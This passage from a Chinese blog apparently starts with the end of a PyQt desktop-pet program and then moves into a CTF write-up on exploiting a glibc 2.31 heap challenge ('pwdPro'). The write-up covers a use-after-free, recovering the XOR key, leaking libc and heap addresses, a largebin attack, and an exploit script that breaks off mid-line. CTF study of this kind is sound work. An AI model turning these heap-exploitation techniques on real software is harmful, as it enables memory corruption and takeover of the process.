class="line">        <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机到一个屏幕上的某个位置&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomPosition</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_geo = QDesktopWidget().screenGeometry()</span><br><span class="line">        pet_geo = self.geometry()</span><br><span class="line">        width = (screen_geo.width() - pet_geo.width()) * random.random()</span><br><span class="line">        height = (screen_geo.height() - pet_geo.height()) * random.random()</span><br><span class="line">        self.move(<span class="built_in">int</span>(width), <span class="built_in">int</span>(height))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出程序&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quit</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.close()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    pets = DesktopPet()</span><br><span class="line">    pets.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v1.3</li>
<li>date：2022.4.14</li>
<li>type：<ul>
<li>Features：<ul>
<li>新添跳跃动作</li>
<li>新添右键菜单</li>
</ul>
</li>
<li>Changed：<ul>
<li>对程序运行逻辑进行的修改，提供了动作的流畅度</li>
</ul>
</li>
<li>Removed：NULL</li>
</ul>
</li>
<li>desc：<ul>
<li>修了一些BUG</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/10/House%20Of%20Banana+House%20Of%20Husk+Tcache%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/10/House%20Of%20Banana+House%20Of%20Husk+Tcache%20attack/" class="post-title-link" itemprop="url">House Of Banana+House Of Husk+Tcache attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-10 18:52:04" itemprop="dateCreated datePublished" datetime="2022-04-10T18:52:04+08:00">2022-04-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-19 18:01:18" itemprop="dateModified" datetime="2022-12-19T18:01:18+08:00">2022-12-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>PassWordBox_ProVersion</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./pwdPro </span><br><span class="line"> _                            _</span><br><span class="line">|_) _.  _  _ \    / _  ._ _| |_)  _</span><br><span class="line">|  (_| _&gt; _&gt;  \/\/ (_) | (_| |_) (_) &gt;&lt;</span><br><span class="line"> _                                 </span><br><span class="line">|_) ._ _    \  / _  ._ _ o  _  ._</span><br><span class="line">|   | (_)    \/ (/_ | _&gt; | (_) | |</span><br><span class="line">Pro Version Advance:</span><br><span class="line"><span class="number">1.</span>Recover Your PassWord.Avoid mistaken <span class="keyword">delete</span>!</span><br><span class="line"><span class="number">2.U</span>nlimited Edit!</span><br><span class="line"><span class="number">3.L</span>ARRRRGER SIZE <span class="number">2</span> STORE YOUR Secret Infomation!</span><br><span class="line"><span class="number">4.B</span>y the way Much Safer Than Free!</span><br><span class="line"><span class="number">5.</span>Enjoy Your Self !</span><br><span class="line">PassWordBox_V3<span class="number">.0</span>_Pro+Version</span><br><span class="line"><span class="number">1.</span>Add Pwd</span><br><span class="line"><span class="number">2.</span>Edit Pwd</span><br><span class="line"><span class="number">3.</span>Show Pwd</span><br><span class="line"><span class="number">4.</span>Delete Pwd</span><br><span class="line"><span class="number">5.</span>Recover</span><br><span class="line"><span class="number">6.</span>Exit</span><br><span class="line">Input Your Choice:</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwdPro: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">0</span>cf87abb0c2c119db0081f9c5e07fd0f028a5480, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/pwdPro&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release versi</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Idx you want 2 Delete:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">0x4F</span> &amp;&amp; *(_DWORD *)chunk_list_start[index].OPkey )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list_start[index].pwd);</span><br><span class="line">    *(_DWORD *)chunk_list_start[index].OPkey = <span class="number">0</span>;<span class="comment">// 没有置空ptr和size,UAF</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>UAF漏洞</p>
<p><strong>入侵思路</strong></p>
<p>本题目可以控制的东西很多，就是这个加密函数有点烦：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">code</span><span class="params">(__int64 pwd, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">2</span> * (size / <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( size % <span class="number">16</span> &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( size % <span class="number">16</span> &gt; <span class="number">0</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_QWORD *)(<span class="number">8LL</span> * i + pwd) ^= randomkey; <span class="comment">/* randomkey是随机的 */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>解密函数和它一模一样</li>
<li>它是以8字节为单位进行加密的</li>
<li>异或加密比较好破解，但需要获取“randomkey”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *pwd; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which PwdBox You Want Add:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt;= <span class="number">0x4F</span> )                          <span class="comment">// 限制index</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input The ID You Want Save:&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    read(<span class="number">0</span>, &amp;chunk_list_start[index], <span class="number">0xF</span>uLL);  <span class="comment">// 直接在结构体中写入name</span></span><br><span class="line">    chunk_list_start[index].canuse = <span class="number">0</span>;         <span class="comment">// 代表写过的chunk不能再次写入</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Length Of Your Pwd:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;size);</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x41F</span> &amp;&amp; size &lt;= <span class="number">0x888</span> )        <span class="comment">// 限制size,只能申请large bin</span></span><br><span class="line">    &#123;</span><br><span class="line">      pwd = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);               <span class="comment">// 在heap中写入pwd</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your Pwd:&quot;</span>);</span><br><span class="line">      getchar();</span><br><span class="line">      fgets(pwd, size, <span class="built_in">stdin</span>);</span><br><span class="line">      code((__int64)pwd, size);</span><br><span class="line">      chunk_list_start[index].size = size;</span><br><span class="line">      chunk_list_start[index].pwd = (__int64)pwd;</span><br><span class="line">      *(_DWORD *)chunk_list_start[index].OPkey = <span class="number">1</span>;<span class="comment">// 需要写入后才能修改</span></span><br><span class="line">      <span class="keyword">if</span> ( !printf_check )                      <span class="comment">// 只有第一次申请会打印数据</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;First Add Done.Thx 4 Use. Save ID:%s&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)chunk_list_start[index].pwd);</span><br><span class="line">        printf_check = <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Why not try To Use Your Pro Size?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行“申请模块”后会对数据进行一次加密，但同时也会泄露加密后的数据（仅限第一次），这就可以计算出“randomkey”了，然后 libc_base 和 heap_base 都可以泄露了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;First Add Done.Thx 4 Use. Save ID:&#x27;</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;key &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = (leak_addr ^ key) - <span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">recover(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = (leak_addr ^ key)-<span class="number">656</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p><strong>House Of Banana</strong></p>
<p>本程序可以主动 exit ，并且申请的空间足够大，所以先尝试一下 House Of Banana</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line"><span class="number">0x7f95f6cc7060</span>-&gt;<span class="number">0x7f95f6c97118</span> is <span class="number">-0x2ff48</span> bytes (<span class="number">-0x5fe9</span> words)</span><br></pre></td></tr></table></figure>
<p>House Of Banana 的关键就是那个 largebin attack：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin <span class="comment">/* fake _rtld_global结构体 */</span> </span><br><span class="line">all: <span class="number">0x555913c6c290</span> —▸ <span class="number">0x7f2d7fbb5be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555913c6c290</span></span><br><span class="line">    </span><br><span class="line">largebins <span class="comment">/* largebin attack的对象 */</span></span><br><span class="line"><span class="number">0x440</span>: <span class="number">0x555913c6cb20</span> —▸ <span class="number">0x7f2d7fbb5fe0</span> (main_arena+<span class="number">1120</span>) ◂— <span class="number">0x555913c6cb20</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555913c6cb20</span> <span class="comment">/* largebins(修改完成) */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555913c6cb20</span> ◂— <span class="number">0x25ecdd3718ff91f6</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555913c6cb28</span> ◂— <span class="number">0x451</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555913c6cb30</span> —▸ <span class="number">0x7f2d7fbb5fe0</span> (main_arena+<span class="number">1120</span>) —▸ <span class="number">0x7f2d7fbb5fd0</span> (main_arena+<span class="number">1104</span>) —▸ <span class="number">0x7f2d7fbb5fc0</span> (main_arena+<span class="number">1088</span>) —▸ <span class="number">0x7f2d7fbb5fb0</span> (main_arena+<span class="number">1072</span>) ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x555913c6cb38</span> —▸ <span class="number">0x7f2d7fbb5fe0</span> (main_arena+<span class="number">1120</span>) —▸ <span class="number">0x7f2d7fbb5fd0</span> (main_arena+<span class="number">1104</span>) —▸ <span class="number">0x7f2d7fbb5fc0</span> (main_arena+<span class="number">1088</span>) —▸ <span class="number">0x7f2d7fbb5fb0</span> (main_arena+<span class="number">1072</span>) ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555913c6cb40</span> —▸ <span class="number">0x555913c6cb20</span> ◂— <span class="number">0x25ecdd3718ff91f6</span> <span class="comment">/* 指向自己 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555913c6cb48</span> —▸ <span class="number">0x7f2d7fbbc0f8</span> ◂— <span class="number">0x0</span> <span class="comment">/* 指向目标 */</span></span><br></pre></td></tr></table></figure>
<p>largebin attack 发生在 chunk 从 unsortedbin 进入 largebins 的一瞬间，large chunk 会把“自己的chunk-&gt;head”写入“目标地址”（“chunk-&gt;BK_size”指向的地址，next_node）</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwdPro&#x27;</span>) </span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwdPro&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="built_in">len</span>,pwd</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Which PwdBox You Want Add:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input The ID You Want Save:&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Length Of Your Pwd:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your Pwd:&#x27;</span>,pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,pwd</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Which PwdBox You Want Edit:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendline(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Which PwdBox You Want Check:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Idx you want 2 Delete:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Idx you want 2 Recover:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span>	</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x438</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;First Add Done.Thx 4 Use. Save ID:&#x27;</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;key &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x448</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = (leak_addr ^ key) - <span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span 